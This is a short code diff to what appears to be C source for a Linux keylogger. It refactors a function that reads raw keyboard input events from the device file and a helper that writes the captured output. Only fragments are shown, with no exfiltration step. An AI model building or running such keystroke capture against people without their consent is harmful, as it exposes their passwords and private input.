@@ -40,8 +40,6 @@ static const char *shifted_keycodes[] =
         "DOWN", "PAGE_DOWN", "INSERT", "DELETE", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN",
         "PAUSE"};
 
-int loop_ctrl;
-
 void get_keyboard_file(char *kbdfile)
 {
     DIR *d;
@@ -68,7 +66,7 @@ void get_keyboard_file(char *kbdfile)
 void writer(int output_fd, const char *strToWrite)
 {
     int written = 0;
-    int toWrite = strlen(strToWrite) + 1;
+    int toWrite = strlen(strToWrite);
 
     do
     {
@@ -99,8 +97,7 @@ void keylogger(int output_fd)
             printf("\nUnable access keyboard device file! Might require SU access...\n");
             exit(1);
         }
-        loop_ctrl = 1;
-        while (loop_ctrl)
+        while (1)
         {
             bRead = read(key_dev_fd, event, sizeof(struct input_event) * 100);
             for (size_t i = 0; i < (bRead / sizeof(struct input_event)); i++)
